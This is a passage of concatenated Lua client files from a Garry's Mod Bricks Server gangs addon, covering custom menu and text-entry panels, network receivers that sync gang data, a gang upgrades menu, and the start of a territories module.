    return text, string.len( text )-string.len( string.Replace( text, "\n", "" ) )+1
end

-- Credits: https://github.com/FPtje/DarkRP/blob/master/gamemode/modules/base/cl_drawfunctions.lua
local function safeText(text)
    return string.match(text, "^#([a-zA-Z_]+)$") and text .. " " or text
end

function BRICKS_SERVER.Func.DrawNonParsedText(text, font, x, y, color, xAlign)
    return draw.DrawText(safeText(text), font, x, y, color, xAlign)
end
--PATH addons/brick_s_server_framework/lua/bricks_server/vgui/bricks_server_dmenuoption.lua:

local PANEL = {}

AccessorFunc( PANEL, "m_pMenu", "Menu" )
AccessorFunc( PANEL, "m_bChecked", "Checked" )
AccessorFunc( PANEL, "m_bCheckable", "IsCheckable" )

function PANEL:Init()

	self:SetContentAlignment( 4 )
	self:SetChecked( false )

end

function PANEL:SetSubMenu( menu )

	self.SubMenu = menu

	if ( !IsValid( self.SubMenuArrow ) ) then

		self.SubMenuArrow = vgui.Create( "DPanel", self )
		self.SubMenuArrow.Paint = function( panel, w, h ) derma.SkinHook( "Paint", "MenuRightArrow", panel, w, h ) end

	end

end

function PANEL:AddSubMenu()

	local SubMenu = DermaMenu( self )
	SubMenu:SetVisible( false )
	SubMenu:SetParent( self )

	self:SetSubMenu( SubMenu )

	return SubMenu

end

function PANEL:OnCursorEntered()

	if ( IsValid( self.ParentMenu ) ) then
		self.ParentMenu:OpenSubMenu( self, self.SubMenu )
		return
	end

	self:GetParent():OpenSubMenu( self, self.SubMenu )

end

function PANEL:OnCursorExited()
end

function PANEL:Paint( w, h )
	if( self:IsHovered() ) then
		self.changeAlpha = math.Clamp( (self.changeAlpha or 0)+10, 0, 255 )
	else
		self.changeAlpha = math.Clamp( (self.changeAlpha or 0)-10, 0, 255 )
	end

	surface.SetAlphaMultiplier( (self.changeAlpha or 0)/255 )
	if( self.parentPanel.optionCount > 1 and self.position == 1 and not self.ParentMenu.dontRoundTop ) then
		draw.RoundedBoxEx( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ), true, true, false, false )
	elseif( self.parentPanel.optionCount > 1 and self.position == self.parentPanel.optionCount ) then
		draw.RoundedBoxEx( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ), false, false, true, true )
	elseif( self.parentPanel.optionCount == 1 ) then
		if( not self.ParentMenu.dontRoundTop ) then
			draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
		else
			draw.RoundedBoxEx( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ), false, false, true, true )
		end
	else
		surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 5 ) )
		surface.DrawRect( 0, 0, w, h )
	end
	surface.SetAlphaMultiplier( 1 )

	draw.SimpleText( self.label or BRICKS_SERVER.Func.L( "error" ), "BRICKS_SERVER_Font20", w/2, h/2, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )

	--
	-- Draw the button text
	--
	return false

end

function PANEL:OnMousePressed( mousecode )

	self.m_MenuClicking = true

	DButton.OnMousePressed( self, mousecode )

end

function PANEL:OnMouseReleased( mousecode )

	DButton.OnMouseReleased( self, mousecode )

	if ( self.m_MenuClicking && mousecode == MOUSE_LEFT ) then

		self.m_MenuClicking = false
		CloseDermaMenus()

	end

end

function PANEL:DoRightClick()

	if ( self:GetIsCheckable() ) then
		self:ToggleCheck()
	end

end

function PANEL:DoClickInternal()

	if ( self:GetIsCheckable() ) then
		self:ToggleCheck()
	end

	if ( self.m_pMenu ) then

		self.m_pMenu:OptionSelectedInternal( self )

	end

end

function PANEL:ToggleCheck()

	self:SetChecked( !self:GetChecked() )
	self:OnChecked( self:GetChecked() )

end

function PANEL:OnChecked( b )
end

function PANEL:PerformLayout()

	self:SizeToContents()
	self:SetWide( self:GetWide() + 30 )

	local w = math.max( self:GetParent():GetWide(), self:GetWide() )

	self:SetSize( w, 40 )

	if ( IsValid( self.SubMenuArrow ) ) then

		self.SubMenuArrow:SetSize( 15, 15 )
		self.SubMenuArrow:CenterVertical()
		self.SubMenuArrow:AlignRight( 4 )

	end

	DButton.PerformLayout( self )

end

function PANEL:GenerateExample()

	-- Do nothing!

end

derma.DefineControl( "bricks_server_dmenuoption", "Menu Option Line", PANEL, "DButton" )

--PATH addons/brick_s_server_framework/lua/bricks_server/vgui/bricks_server_textentry.lua:

local PANEL = {}

local strAllowedNumericCharacters = "1234567890.-"

AccessorFunc( PANEL, "m_bAllowEnter", "EnterAllowed", FORCE_BOOL )
AccessorFunc( PANEL, "m_bUpdateOnType", "UpdateOnType", FORCE_BOOL ) -- Update the convar as we type
AccessorFunc( PANEL, "m_bNumeric", "Numeric", FORCE_BOOL )
AccessorFunc( PANEL, "m_bHistory", "HistoryEnabled", FORCE_BOOL )
AccessorFunc( PANEL, "m_bDisableTabbing", "TabbingDisabled", FORCE_BOOL )

AccessorFunc( PANEL, "m_FontName", "Font" )
AccessorFunc( PANEL, "m_bBorder", "DrawBorder" )
AccessorFunc( PANEL, "m_bBackground", "PaintBackground" )
AccessorFunc( PANEL, "m_bBackground", "DrawBackground" ) -- Deprecated

AccessorFunc( PANEL, "m_colText", "TextColor" )
AccessorFunc( PANEL, "m_hintText", "HintText" )
AccessorFunc( PANEL, "m_colHighlight", "HighlightColor" )
AccessorFunc( PANEL, "m_colCursor", "CursorColor" )

AccessorFunc( PANEL, "m_colPlaceholder", "PlaceholderColor" )
AccessorFunc( PANEL, "m_txtPlaceholder", "PlaceholderText" )

Derma_Install_Convar_Functions( PANEL )

function PANEL:Init()

	self:SetHistoryEnabled( false )
	self.History = {}
	self.HistoryPos = 50

	--
	-- We're going to draw these ourselves in
	-- the skin system - so disable them here.
	-- This will leave it only drawing text.
	--
	self:SetPaintBorderEnabled( false )
	self:SetPaintBackgroundEnabled( false )

	--
	-- These are Lua side commands
	-- Defined above using AccessorFunc
	--
	self:SetDrawBorder( true )
	self:SetPaintBackground( true )
	self:SetEnterAllowed( true )
	self:SetUpdateOnType( false )
	self:SetNumeric( false )
	self:SetAllowNonAsciiCharacters( true )

	-- Nicer default height
	self:SetTall( 20 )

	-- Clear keyboard focus when we click away
	self.m_bLoseFocusOnClickAway = true

	-- Beam Me Up Scotty
	self:SetCursor( "beam" )

	self:SetFont( "BRICKS_SERVER_Font23" )
	self:SetText( "" )
	self:SetTextColor( Color( 255, 255, 255, 20 ) )
	self:SetCursorColor( Color( 255, 255, 255 ) )
	self:DockMargin( 10, 0, 0, 0 )
end

function PANEL:IsEditing()
	return self == vgui.GetKeyboardFocus()
end

function PANEL:OnKeyCodeTyped( code )

	self:OnKeyCode( code )

	if ( code == KEY_ENTER && !self:IsMultiline() && self:GetEnterAllowed() ) then

		if ( IsValid( self.Menu ) ) then
			self.Menu:Remove()
		end

		self:FocusNext()
		self:OnEnter()
		self.HistoryPos = 0

	end

	if ( self.m_bHistory || IsValid( self.Menu ) ) then

		if ( code == KEY_UP ) then
			self.HistoryPos = self.HistoryPos - 1
			self:UpdateFromHistory()
		end

		if ( code == KEY_DOWN || code == KEY_TAB ) then
			self.HistoryPos = self.HistoryPos + 1
			self:UpdateFromHistory()
		end

	end

end

function PANEL:OnKeyCode( code )
end

function PANEL:ApplySchemeSettings()

	self:SetFontInternal( self.m_FontName )

	derma.SkinHook( "Scheme", "TextEntry", self )

end

function PANEL:GetTextColor()

	return self.m_colText || self:GetSkin().colTextEntryText

end

function PANEL:GetHintText()

	return self.m_hintText

end

function PANEL:GetPlaceholderColor()

	return self.m_colPlaceholder || self:GetSkin().colTextEntryTextPlaceholder

end

function PANEL:GetHighlightColor()

	return self.m_colHighlight || self:GetSkin().colTextEntryTextHighlight

end

function PANEL:GetCursorColor()

	return self.m_colCursor || self:GetSkin().colTextEntryTextCursor

end

function PANEL:UpdateFromHistory()

	if ( IsValid( self.Menu ) ) then
		return self:UpdateFromMenu()
	end

	local pos = self.HistoryPos
	-- Is the Pos within bounds?
	if ( pos < 0 ) then pos = #self.History end
	if ( pos > #self.History ) then pos = 0 end

	local text = self.History[ pos ]
	if ( !text ) then text = "" end

	self:SetText( text )
	self:SetCaretPos( text:len() )

	self:OnTextChanged()

	self.HistoryPos = pos

end

function PANEL:UpdateFromMenu()

	local pos = self.HistoryPos
	local num = self.Menu:ChildCount()

	self.Menu:ClearHighlights()

	if ( pos < 0 ) then pos = num end
	if ( pos > num ) then pos = 0 end

	local item = self.Menu:GetChild( pos )
	if ( !item ) then
		self:SetText( "" )
		self.HistoryPos = pos
		return
	end

	self.Menu:HighlightItem( item )

	local txt = item:GetText()

	self:SetText( txt )
	self:SetCaretPos( txt:len() )

	self:OnTextChanged( true )

	self.HistoryPos = pos

end

function PANEL:OnTextChanged( noMenuRemoval )

	self.HistoryPos = 0

	if ( self:GetUpdateOnType() ) then
		self:UpdateConvarValue()
		self:OnValueChange( self:GetText() )
	end

	if ( IsValid( self.Menu ) && !noMenuRemoval ) then
		self.Menu:Remove()
	end

	local tab = self:GetAutoComplete( self:GetText() )
	if ( tab ) then
		self:OpenAutoComplete( tab )
	end

	self:OnChange()

end

function PANEL:OnChange()
end

function PANEL:OpenAutoComplete( tab )

	if ( !tab ) then return end
	if ( #tab == 0 ) then return end

	self.Menu = DermaMenu()

	for k, v in pairs( tab ) do

		self.Menu:AddOption( v, function() self:SetText( v ) self:SetCaretPos( v:len() ) self:RequestFocus() end )

	end

	local x, y = self:LocalToScreen( 0, self:GetTall() )
	self.Menu:SetMinimumWidth( self:GetWide() )
	self.Menu:Open( x, y, true, self )
	self.Menu:SetPos( x, y )
	self.Menu:SetMaxHeight( ( ScrH() - y ) - 10 )

end

local Alpha = 20
function PANEL:Think()

	self:ConVarStringThink()

	if( self:IsEditing() and Alpha != 255 ) then
		Alpha = math.Clamp( Alpha+20, 20, 255 )
	elseif( not self:IsEditing() and Alpha != 20 ) then
		Alpha = math.Clamp( Alpha-20, 20, 255 )
	end

	if( self:GetTextColor() != Color( 255, 255, 255, 255 ) or self:GetTextColor() != Color( 255, 255, 255, 20 ) ) then
		self:SetTextColor( Color( 255, 255, 255, Alpha ) )
	end
end

function PANEL:OnEnter()

	-- For override
	self:UpdateConvarValue()
	self:OnValueChange( self:GetText() )

end

function PANEL:UpdateConvarValue()

	-- This only kicks into action if this variable has
	-- a ConVar associated with it.
	self:ConVarChanged( self:GetValue() )

end

function PANEL:Paint( w, h )
	if( self.backColor ) then
		if( self:IsEditing() ) then
			draw.RoundedBox( 5, 0, 0, w, h, self.backColor )
		else
			surface.SetAlphaMultiplier( 0.75 )
			draw.RoundedBox( 5, 0, 0, w, h, self.backColor )
			surface.SetAlphaMultiplier( 1 )
		end
	end

	local panel = self

	if ( panel.GetPlaceholderText && panel.GetPlaceholderColor && panel:GetPlaceholderText() && panel:GetPlaceholderText():Trim() != "" && panel:GetPlaceholderColor() && ( !panel:GetText() || panel:GetText() == "" ) ) then

		local oldText = panel:GetText()

		local str = panel:GetPlaceholderText()
		if ( str:StartWith( "#" ) ) then str = str:sub( 2 ) end
		str = language.GetPhrase( str )

		panel:SetText( str )
		panel:DrawTextEntryText( panel:GetPlaceholderColor(), panel:GetHighlightColor(), panel:GetCursorColor() )
		panel:SetText( oldText )

		return
	end

	panel:DrawTextEntryText( panel:GetTextColor(), panel:GetHighlightColor(), panel:GetCursorColor() )
end

function PANEL:PerformLayout()

	derma.SkinHook( "Layout", "TextEntry", self )

end

function PANEL:SetValue( strValue )

	-- Don't update if we're typing into it!
	-- I'm sure a lot of people will want to reverse this behaviour :(
	if ( vgui.GetKeyboardFocus() == self ) then return end

	local CaretPos = self:GetCaretPos()

	self:SetText( strValue )
	self:OnValueChange( strValue )

	self:SetCaretPos( CaretPos )

end

function PANEL:OnValueChange( strValue )
	-- For Override
end

function PANEL:CheckNumeric( strValue )

	-- Not purely numeric, don't run the check
	if ( !self:GetNumeric() ) then return false end

	-- God I hope numbers look the same in every language
	if ( !string.find( strAllowedNumericCharacters, strValue, 1, true ) ) then

		-- Noisy Error?
		return true

	end

	return false

end

function PANEL:SetDisabled( bDisabled )
	self:SetEnabled( !bDisabled )
end

function PANEL:GetDisabled( bDisabled )
	return !self:IsEnabled()
end

function PANEL:AllowInput( strValue )

	-- This is layed out like this so you can easily override and
	-- either keep or remove this numeric check.
	if ( self:CheckNumeric( strValue ) ) then return true end

end

function PANEL:SetEditable( b )

	self:SetKeyboardInputEnabled( b )
	self:SetMouseInputEnabled( b )

end

function PANEL:OnGetFocus()

	--
	-- These hooks are here for the sake of things like the spawn menu
	-- which don't have key focus until you click on one of the text areas.
	--
	-- If you make a control for the spawnmenu that requires keyboard input
	-- You should have these 3 functions in your panel, so it can handle it.
	--

	hook.Run( "OnTextEntryGetFocus", self )

end

function PANEL:OnLoseFocus()

	self:UpdateConvarValue()

	hook.Call( "OnTextEntryLoseFocus", nil, self )

end

function PANEL:OnMousePressed( mcode )

	self:OnGetFocus()

end

function PANEL:AddHistory( txt )

	if ( !txt || txt == "" ) then return end

	table.RemoveByValue( self.History, txt )
	table.insert( self.History, txt )

end

function PANEL:GetAutoComplete( txt )
	-- for override. Return a table of strings.
end

function PANEL:GetInt()

	return math.floor( tonumber( self:GetText() ) + 0.5 )

end

function PANEL:GetFloat()

	return tonumber( self:GetText() )

end

derma.DefineControl( "bricks_server_textentry", "A simple TextEntry control", PANEL, "TextEntry" )

--[[---------------------------------------------------------
	Clear the focus when we click away from us..
-----------------------------------------------------------]]
hook.Add( "VGUIMousePressed", "BRS_TextEntryLoseFocus", function( panel, mcode )
	hook.Remove( "VGUIMousePressed", "TextEntryLoseFocus" )

	local pnl = vgui.GetKeyboardFocus()
	if ( !pnl ) then return end
	if ( pnl == panel ) then return end
	if ( panel:GetName() == "bricks_server_dmenuoption" ) then return end
	if ( !pnl.m_bLoseFocusOnClickAway ) then return end

	pnl:FocusNext()
end )

--PATH addons/bricks_gangs/lua/bricks_server/modules/gangs/client/cl_gang_data.lua:
net.Receive( "BRS.Net.SetGangID", function()
    BRS_GANGID = net.ReadUInt( 16 )
    
    timer.Simple( 0.1, function() 
        hook.Run( "BRS.Hooks.RefreshGang" ) 
    end )
end )

net.Receive( "BRS.Net.SetGangTable", function()
    local gangID = net.ReadUInt( 16 )
    local gangTable = net.ReadTable()

    if( not BRICKS_SERVER_GANGS ) then
        BRICKS_SERVER_GANGS = {}
    end

    BRICKS_SERVER_GANGS[gangID] = gangTable

    hook.Run( "BRS.Hooks.RefreshGang" )
end )

net.Receive( "BRS.Net.SetGangTableValues", function()
    local gangID = net.ReadUInt( 16 )
    local valuesTable = net.ReadTable()

    if( not BRICKS_SERVER_GANGS ) then
        BRICKS_SERVER_GANGS = {}
    end

    if( not BRICKS_SERVER_GANGS[gangID] ) then
        BRICKS_SERVER_GANGS[gangID] = {}
    end

    local valuesChanged = {}
    for k, v in pairs( valuesTable ) do
        BRICKS_SERVER_GANGS[gangID][k] = v

        valuesChanged[k] = true
    end

    hook.Run( "BRS.Hooks.RefreshGang", valuesChanged )
end )

net.Receive( "BRS.Net.SetGangTableValue", function()
    local gangID = net.ReadUInt( 16 )
    local tableKey = net.ReadString()

    local dataType = (BRICKS_SERVER.DEVCONFIG.GangTableKeys[tableKey] or {})[2]

    if( not dataType ) then return end

    local tableValue
    if( dataType == "string" ) then
        tableValue = net.ReadString()
    elseif( dataType == "integer" ) then
        tableValue = net.ReadUInt( 32 )
    elseif( dataType == "table" ) then
        tableValue = net.ReadTable()
    end

    if( not tableValue ) then return end
    
    if( not BRICKS_SERVER_GANGS ) then
        BRICKS_SERVER_GANGS = {}
    end

    if( not BRICKS_SERVER_GANGS[gangID] ) then
        BRICKS_SERVER_GANGS[gangID] = {}
    end

    BRICKS_SERVER_GANGS[gangID][tableKey] = tableValue 

    hook.Run( "BRS.Hooks.RefreshGang", { [tableKey] = true } )
end )

-- Обработчик получения полной таблицы названий и иконок
BRICKS_SERVER_GANGNAMES = BRICKS_SERVER_GANGNAMES or {}
net.Receive("BRS.Net.SetGangNameTable", function()
    BRICKS_SERVER_GANGNAMES = net.ReadTable() or {}
end)

-- Обработчик обновлений для отдельных банд
local typesof = {
    ["Delete"] = function(gangID)
        BRICKS_SERVER_GANGNAMES[gangID] = nil
    end,
    ["Add"] = function(gangID)
        local name = net.ReadString()
        local icon = net.ReadString() -- Читаем иконку
        BRICKS_SERVER_GANGNAMES[gangID] = {
            Name = name,
            Icon = icon
        }
    end,
    ["Change"] = function(gangID)
        local name = net.ReadString()
        local icon = net.ReadString() -- Читаем иконку
        BRICKS_SERVER_GANGNAMES[gangID] = {
            Name = name,
            Icon = icon
        }
    end
}

net.Receive("BRS.Net.UpdateGangNameTable", function()
    local gangID = net.ReadUInt(16)
    local typeof = net.ReadString()
    
    if typesof[typeof] then
        typesof[typeof](gangID)
    end
end)
--PATH addons/bricks_gangs/lua/bricks_server/modules/gangs/vgui/bricks_server_gangmenu_upgrades.lua:
local PANEL = {}

function PANEL:Init()
    self:DockMargin( 10, 10, 10, 10 )
end

function PANEL:FillPanel( gangTable )
    function self.RefreshPanel()
        self:Clear()

        local sortedUpgrades = {}
        for k, v in pairs( BRICKS_SERVER.CONFIG.GANGS.Upgrades or {} ) do
            local upgradeTable = v
            upgradeTable.Key = k
            upgradeTable.SortValue = 1+((not v.Tiers and 100) or 0)

            table.insert( sortedUpgrades, upgradeTable )
        end

        table.SortByMember( sortedUpgrades, "SortValue", true )

        for k, v in pairs( sortedUpgrades ) do
            local k = v.Key
            local upgradeDevConfig = BRICKS_SERVER.DEVCONFIG.GangUpgrades[v.Type or k] or {}
            local upgradeTiers = v.Tiers

            if( #(upgradeTiers or {}) <= 0 ) then continue end

            local upgrade
            if( not upgradeDevConfig.Unlimited ) then
                upgrade = 0
                if( gangTable and gangTable.Upgrades and gangTable.Upgrades[k] ) then
                    upgrade = gangTable.Upgrades[k] or 0
                end
            else
                upgrade = (BRICKS_SERVER.Func.GangGetUpgradeBought( LocalPlayer():GetGangID(), k ) and 1) or 0
            end

            local upgradeBack = vgui.Create( "DPanel", self )
            upgradeBack:Dock( TOP )
            upgradeBack:DockMargin( 0, 0, 0, 5 )
            upgradeBack:SetTall( 80 )
            upgradeBack.Paint = function( self2, w, h ) 
                draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
            end

            local upgradeIcon = vgui.Create( "DPanel", upgradeBack )
            upgradeIcon:Dock( LEFT )
            upgradeIcon:DockMargin( 0, 0, 0, 0 )
            upgradeIcon:SetWide( upgradeBack:GetTall() )
            local iconMat = Material( "bricks_server/upgrades.png" )
            if( v.Icon ) then
                BRICKS_SERVER.Func.GetImage( v.Icon, function( mat ) 
                    iconMat = mat 
                end )
            end
            upgradeIcon.Paint = function( self2, w, h ) 
                surface.SetDrawColor( 255, 255, 255, 255 )
                surface.SetMaterial( iconMat )
                local iconSize = 64
                surface.DrawTexturedRect( (w/2)-(iconSize/2), (h/2)-(iconSize/2), iconSize, iconSize )
            end

            local upgradeInfo = vgui.Create( "DPanel", upgradeBack )
            upgradeInfo:Dock( LEFT )
            upgradeInfo:DockMargin( 0, 10, 0, 10 )
            upgradeInfo:SetWide( 125 )
            upgradeInfo.Paint = function( self2, w, h ) 
                draw.SimpleText( (v.Name or BRICKS_SERVER.Func.L( "gangNewUpgrade" )), "BRICKS_SERVER_Font17", 0, 5, BRICKS_SERVER.Func.GetTheme( 5 ), 0, 0 )
            end

            local upgradeDescription = vgui.Create( "DPanel", upgradeInfo )
            upgradeDescription:Dock( FILL )
            upgradeDescription:DockMargin( 0, 22, 0, 0 )
            upgradeDescription.Paint = function( self2, w, h )
                local description = BRICKS_SERVER.Func.TextWrap( (v.Description or BRICKS_SERVER.Func.L( "noDescription" )), "BRICKS_SERVER_Font17", w )

                BRICKS_SERVER.Func.DrawNonParsedText( description, "BRICKS_SERVER_Font17", 0, 0, BRICKS_SERVER.Func.GetTheme( 6 ), 0 )
            end

            local completed = (not upgradeDevConfig.Unlimited and upgrade >= #upgradeTiers) or (upgradeDevConfig.Unlimited and upgrade == 1)
            if( LocalPlayer():GangHasPermission( "PurchaseUpgrades" ) and not completed ) then
                local price = v.Price or (upgradeTiers[upgrade+1].Price or 0)

                local upgradeButton = vgui.Create( "DButton", upgradeBack )
                upgradeButton:Dock( RIGHT )
                upgradeButton:DockMargin( 0, 10, 10, 10 )
                upgradeButton:SetWide( upgradeBack:GetTall()-20 )
                upgradeButton:SetText( "" )
                local Alpha = 0
                local upgradeMat = Material( "bricks_server/gang_upgrade.png" )
                upgradeButton.Paint = function( self2, w, h )
                    if( self2:IsDown() ) then
                        Alpha = 0
                    elseif( self2:IsHovered() ) then
                        Alpha = math.Clamp( Alpha+5, 0, 75 )
                    else
                        Alpha = math.Clamp( Alpha-5, 0, 75 )
                    end

                    draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
                    surface.SetAlphaMultiplier( Alpha/255 )
                    draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
                    surface.SetAlphaMultiplier( 1 )

                    surface.SetDrawColor( 255, 255, 255, 20+(235*(Alpha/75)) )
                    surface.SetMaterial( upgradeMat )
                    local iconSize = 32
                    surface.DrawTexturedRect( (w/2)-(iconSize/2), (h/2)-(iconSize/2), iconSize, iconSize )
                end
                upgradeButton.DoClick = function()
                    if( (upgradeTiers and not upgradeTiers[upgrade+1]) or (upgradeDevConfig.Unlimited and upgrade == 1) ) then return end

                    BRICKS_SERVER.Func.Query( BRICKS_SERVER.Func.L( "gangBuyUpgrade", DarkRP.formatMoney( price ) ), BRICKS_SERVER.Func.L( "gang" ), BRICKS_SERVER.Func.L( "confirm" ), BRICKS_SERVER.Func.L( "cancel" ), function() 
                        net.Start( "BRS.Net.GangUpgrade" )
                            net.WriteString( k )
                        net.SendToServer()
                    end )
                end
            elseif( completed ) then
                local completedBack = vgui.Create( "DPanel", upgradeBack )
                completedBack:Dock( RIGHT )
                completedBack:DockMargin( 0, 10, 10, 10 )
                completedBack:SetWide( upgradeBack:GetTall()-20 )
                local completedMat = Material( "bricks_server/gang_upgrade_bought.png" )
                completedBack.Paint = function( self2, w, h )
                    draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )

                    surface.SetDrawColor( 255, 255, 255, 20 )
                    surface.SetMaterial( completedMat )
                    local iconSize = 32
                    surface.DrawTexturedRect( (w/2)-(iconSize/2), (h/2)-(iconSize/2), iconSize, iconSize )
                end 
            end

            if( not upgradeDevConfig.Unlimited and upgradeTiers ) then
                local upgradeProgress = vgui.Create( "DPanel", upgradeBack )
                upgradeProgress:Dock( BOTTOM )
                upgradeProgress:DockMargin( 5, 0, 5, 10 )
                upgradeProgress:SetTall( 32 )
                local themeColor = BRICKS_SERVER.Func.GetTheme( 0 )
                local overlayColor = Color( themeColor.r, themeColor.g, themeColor.b, 125 )
                upgradeProgress.Paint = function( self2, w, h ) 
                    draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )

                    local decimal = math.Clamp( upgrade/#upgradeTiers, 0, 1 )

                    draw.RoundedBox( 5, 0, 0, w*decimal, h, overlayColor )

                    draw.SimpleText( BRICKS_SERVER.Func.L( "gangUpgradeTier", math.min( upgrade, #upgradeTiers ), #upgradeTiers ), "BRICKS_SERVER_Font17", 10, h/2-1, BRICKS_SERVER.Func.GetTheme( 6 ), 0, TEXT_ALIGN_CENTER )
                    
                    draw.SimpleText( math.floor( decimal*100 ) .. "%", "BRICKS_SERVER_Font17", w-10, h/2-1, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER )
                end

                local upgradeReqInfoBack = vgui.Create( "DPanel", upgradeBack )
                upgradeReqInfoBack:Dock( FILL )
                upgradeReqInfoBack:DockMargin( 5, 10, 5, 5 )
                upgradeReqInfoBack.Paint = function( self2, w, h ) end
                upgradeReqInfoBack.AddInfo = function( text, dockRight, color )
                    surface.SetFont( "BRICKS_SERVER_Font17" )
                    local textX, textY = surface.GetTextSize( text )

                    local upgradeReqInfo = vgui.Create( "DPanel", upgradeReqInfoBack )
                    upgradeReqInfo:Dock( (dockRight and RIGHT) or LEFT )
                    upgradeReqInfo:DockMargin( (dockRight and 5) or 0, 0, (not dockRight and 5) or 0, 0 )
                    upgradeReqInfo:SetWide( textX+15 )
                    upgradeReqInfo.Paint = function( self2, w, h ) 
                        draw.RoundedBox( 5, 0, 0, w, h, (color or BRICKS_SERVER.Func.GetTheme( 4 )) )

                        draw.SimpleText( text, "BRICKS_SERVER_Font17", w/2, h/2-1, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
                    end
                end

                local currentText = BRICKS_SERVER.Func.L( "gangCurrent", 0 )
                local currentReqInfo = v.Default or {}
                if( upgradeTiers[upgrade] and upgradeTiers[upgrade].ReqInfo ) then
                    currentReqInfo = upgradeTiers[upgrade].ReqInfo
                end

                if( upgradeDevConfig.Format ) then
                    currentText = BRICKS_SERVER.Func.L( "gangCurrent", upgradeDevConfig.Format( currentReqInfo ) )
                else
                    currentText = BRICKS_SERVER.Func.L( "gangCurrent", currentReqInfo[1] or 0 )
                end

                upgradeReqInfoBack.AddInfo( currentText, false )

                local nextTierTable = upgradeTiers[upgrade+1]
                if( nextTierTable ) then
                    local nextText = BRICKS_SERVER.Func.L( "gangNext", 0 )
                    local nextReqInfo = {}
                    if( nextTierTable and nextTierTable.ReqInfo and nextTierTable.ReqInfo ) then
                        nextReqInfo = nextTierTable.ReqInfo
                    end

                    if( upgradeDevConfig.Format ) then
                        nextText = BRICKS_SERVER.Func.L( "gangNext", upgradeDevConfig.Format( nextReqInfo ) )
                    else
                        nextText = BRICKS_SERVER.Func.L( "gangNext", nextReqInfo[1] or 0 )
                    end

                    upgradeReqInfoBack.AddInfo( nextText, true, Color(39, 174, 96) )

                    if( nextTierTable.Level ) then
                        upgradeReqInfoBack.AddInfo( BRICKS_SERVER.Func.L( "levelX", nextTierTable.Level ), true )
                    end

                    if( nextTierTable.Group ) then
                        local groupTable
                        for k, v in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
                            if( v[1] == nextTierTable.Group ) then
                                groupTable = v
                            end
                        end

                        if( groupTable ) then
                            upgradeReqInfoBack.AddInfo( (groupTable[1] or BRICKS_SERVER.Func.L( "none" )), true, groupTable[3] )
                        end
                    end
                end
            else
                local upgradeReqInfoBack = vgui.Create( "DPanel", upgradeBack )
                upgradeReqInfoBack:Dock( TOP )
                upgradeReqInfoBack:SetTall( 23 )
                upgradeReqInfoBack:DockMargin( 5, 10, 5, 5 )
                upgradeReqInfoBack.Paint = function( self2, w, h ) end
                upgradeReqInfoBack.AddInfo = function( text, dockRight, color )
                    surface.SetFont( "BRICKS_SERVER_Font17" )
                    local textX, textY = surface.GetTextSize( text )

                    local upgradeReqInfo = vgui.Create( "DPanel", upgradeReqInfoBack )
                    upgradeReqInfo:Dock( (dockRight and RIGHT) or LEFT )
                    upgradeReqInfo:DockMargin( (dockRight and 5) or 0, 0, (not dockRight and 5) or 0, 0 )
                    upgradeReqInfo:SetWide( textX+15 )
                    upgradeReqInfo.Paint = function( self2, w, h ) 
                        draw.RoundedBox( 5, 0, 0, w, h, (color or BRICKS_SERVER.Func.GetTheme( 4 )) )

                        draw.SimpleText( text, "BRICKS_SERVER_Font17", w/2, h/2-1, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
                    end
                end

                if( v.Level ) then
                    upgradeReqInfoBack.AddInfo( BRICKS_SERVER.Func.L( "levelX", v.Level ), true )
                end

                if( v.Group ) then
                    local groupTable
                    for key, val in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
                        if( val[1] == v.Group ) then
                            groupTable = val
                        end
                    end

                    if( groupTable ) then
                        upgradeReqInfoBack.AddInfo( (groupTable[1] or BRICKS_SERVER.Func.L( "none" )), true, groupTable[3] )
                    end
                end
            end
        end
    end
    self.RefreshPanel()

    hook.Add( "BRS.Hooks.RefreshGang", self, function( self, valuesChanged )
        if( IsValid( self ) ) then
            if( valuesChanged and valuesChanged["Upgrades"] ) then
                self.RefreshPanel()
            end
        else
            hook.Remove( "BRS.Hooks.RefreshGang", self )
        end
    end )
end

function PANEL:Paint( w, h )

end

vgui.Register( "bricks_server_gangmenu_upgrades", PANEL, "bricks_server_scrollpanel" )
--PATH addons/bricks_gangs/lua/bricks_server/modules/gangs/submodules/territories/client/cl_gang_territories.lua:
BRICKS_SERVER.Func.AddConfigPage( BRICKS_SERVER.Func.L( "gangTerritories" ), "bricks_server_config_gang_territories", "gangs" )

BRS_GANG_TERRITORIES = BRS_GANG_TERRITORIES or {}
net.Receive( "BRS.Net.SendGangTerritoriesTable", function()
    BRS_GANG_TERRITORIES = net.ReadTable() or {}

    hook.Run( "BRS.Hooks.RefreshGangTerritories" )
end )

net.Receive( "BRS.Net.SendGangTerritoriesValue", function()
    if( not BRS_GANG_TERRITORIES ) then
        BRS_GANG_TERRITORIES = {}
    end

    BRS_GANG_TERRITORIES[net.ReadUInt( 8 ) or 0] = net.ReadTable() or {}

    hook.Run( "BRS.Hooks.RefreshGangTerritories" )
end )

net.Receive( "BRS.Net.SendTerritoryGangTables", function()
    if( not BRICKS_SERVER_GANGS ) then
        BRICKS_SERVER_GANGS = {}
    end

    for k, v in pairs( net.ReadTable() or {} ) do
        if( not BRICKS_SERVER_GANGS[k] ) then
            BRICKS_SERVER_GANGS[k] = {}
        end

        for key, val in pairs( v ) do
            BRICKS_SERVER_GANGS[k][key] = val
